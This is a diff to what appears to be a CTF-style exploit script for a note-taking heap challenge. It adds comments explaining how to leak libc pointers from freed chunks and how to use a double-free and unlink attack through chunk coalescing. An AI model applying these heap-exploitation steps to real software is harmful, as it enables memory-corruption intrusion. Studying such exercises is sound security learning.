@@ -99,10 +99,10 @@ if __name__ == "__main__":
 
     r.recvuntil('Your choice:')
 
-    new_note(p32(0xdeadbeef))
+    new_note(p32(0xdeadbeef)) # alloc two chunk and delete the first one
     new_note(p32(0xdeadbeef))
 
-    delete_note(0)
+    delete_note(0) # glibc malloc manager will write fd/bk pointer into the chunk which point somewhere in libc area
 
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
@@ -160,9 +160,10 @@ if __name__ == "__main__":
     #
     # Step 2)
     #
-    # land the carefully crafted one big chunk which will overwrite the metadata of 2 (already free'ed) chunks
+    # Land the carefully crafted one big chunk which will overwrite the metadata of already free chunks
+    # Remember it has double-free vulnerability!
     #
-    # what will happen:
+    # What will happen:
     #
     # 1) free( note_1 ) will cause coalescing (take note_0 off a free list and merge with note_1)
     # 2)  -> unlink( note_0 ) ( to take note_0 off )
